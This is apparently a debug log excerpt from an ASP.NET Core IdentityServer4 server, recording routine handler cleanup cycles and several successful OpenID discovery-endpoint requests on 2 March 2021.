+2021-03-02 14:55:23.982 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0069ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:55:33.982 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:55:33.982 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0103ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:55:43.982 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:55:43.983 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0078ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:55:53.983 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:55:53.984 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0226ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:56:03.983 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:56:03.983 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0083ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:56:13.984 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:56:13.984 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0072ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:56:17.000 +08:00 [DBG] Connection id "0HM6T8MKCESH0" accepted.
+2021-03-02 14:56:17.001 +08:00 [DBG] Connection id "0HM6T8MKCESH0" started.
+2021-03-02 14:56:17.012 +08:00 [INF] Request starting HTTP/1.0 GET http://106.13.130.51:8080/.well-known/openid-configuration  
+2021-03-02 14:56:17.013 +08:00 [VRB] All hosts are allowed.
+2021-03-02 14:56:17.013 +08:00 [DBG] The request path /.well-known/openid-configuration does not match a supported file type
+2021-03-02 14:56:17.015 +08:00 [DBG] No candidates found for the request path '/.well-known/openid-configuration'
+2021-03-02 14:56:17.015 +08:00 [DBG] Request did not match any endpoints
+2021-03-02 14:56:17.017 +08:00 [DBG] AuthenticationScheme: idsrv was not authenticated.
+2021-03-02 14:56:17.017 +08:00 [DBG] AuthenticationScheme: idsrv was not authenticated.
+2021-03-02 14:56:17.021 +08:00 [DBG] Request path /.well-known/openid-configuration matched to endpoint type Discovery
+2021-03-02 14:56:17.027 +08:00 [INF] 激活 Endpoint [DiscoveryEndpoint]
+2021-03-02 14:56:17.027 +08:00 [DBG] Endpoint enabled: Discovery, successfully created handler: IdentityServer4.Endpoints.DiscoveryEndpoint
+2021-03-02 14:56:17.028 +08:00 [INF] Invoking IdentityServer endpoint: IdentityServer4.Endpoints.DiscoveryEndpoint for /.well-known/openid-configuration
+2021-03-02 14:56:17.030 +08:00 [DBG] Start discovery request
+2021-03-02 14:56:17.078 +08:00 [INF] HTTP GET /.well-known/openid-configuration responded 200 in 64.7772272732987 ms
+2021-03-02 14:56:17.078 +08:00 [INF] Request finished in 66.2939ms 200 application/json; charset=UTF-8
+2021-03-02 14:56:17.078 +08:00 [DBG] Connection id "0HM6T8MKCESH0" disconnecting.
+2021-03-02 14:56:17.079 +08:00 [DBG] Connection id "0HM6T8MKCESH0" stopped.
+2021-03-02 14:56:17.079 +08:00 [DBG] Connection id "0HM6T8MKCESH0" sending FIN because: "The Socket transport's send loop completed gracefully."
+2021-03-02 14:56:17.269 +08:00 [DBG] Connection id "0HM6T8MKCESH1" accepted.
+2021-03-02 14:56:17.270 +08:00 [DBG] Connection id "0HM6T8MKCESH1" started.
+2021-03-02 14:56:17.275 +08:00 [INF] Request starting HTTP/1.1 GET http://106.13.130.51:8080/.well-known/openid-configuration  
+2021-03-02 14:56:17.276 +08:00 [VRB] All hosts are allowed.
+2021-03-02 14:56:17.276 +08:00 [DBG] Unknown proxy: 113.96.223.240:43621
+2021-03-02 14:56:17.277 +08:00 [DBG] The request path /.well-known/openid-configuration does not match a supported file type
+2021-03-02 14:56:17.277 +08:00 [DBG] No candidates found for the request path '/.well-known/openid-configuration'
+2021-03-02 14:56:17.277 +08:00 [DBG] Request did not match any endpoints
+2021-03-02 14:56:17.282 +08:00 [DBG] AuthenticationScheme: idsrv was not authenticated.
+2021-03-02 14:56:17.285 +08:00 [DBG] AuthenticationScheme: idsrv was not authenticated.
+2021-03-02 14:56:17.285 +08:00 [DBG] Request path /.well-known/openid-configuration matched to endpoint type Discovery
+2021-03-02 14:56:17.286 +08:00 [INF] 激活 Endpoint [DiscoveryEndpoint]
+2021-03-02 14:56:17.286 +08:00 [DBG] Endpoint enabled: Discovery, successfully created handler: IdentityServer4.Endpoints.DiscoveryEndpoint
+2021-03-02 14:56:17.286 +08:00 [INF] Invoking IdentityServer endpoint: IdentityServer4.Endpoints.DiscoveryEndpoint for /.well-known/openid-configuration
+2021-03-02 14:56:17.286 +08:00 [DBG] Start discovery request
+2021-03-02 14:56:17.288 +08:00 [INF] HTTP GET /.well-known/openid-configuration responded 200 in 11.033525210606376 ms
+2021-03-02 14:56:17.288 +08:00 [DBG] Connection id "0HM6T8MKCESH1" completed keep alive response.
+2021-03-02 14:56:17.288 +08:00 [INF] Request finished in 12.7189ms 200 application/json; charset=UTF-8
+2021-03-02 14:56:21.043 +08:00 [DBG] Connection id "0HM6T8MKCESH2" accepted.
+2021-03-02 14:56:21.044 +08:00 [DBG] Connection id "0HM6T8MKCESH2" started.
+2021-03-02 14:56:21.045 +08:00 [DBG] Connection id "0HM6T8MKCESH3" accepted.
+2021-03-02 14:56:21.045 +08:00 [DBG] Connection id "0HM6T8MKCESH3" started.
+2021-03-02 14:56:21.046 +08:00 [INF] Request starting HTTP/1.1 GET http://106.13.130.51:8080/.well-known/openid-configuration  
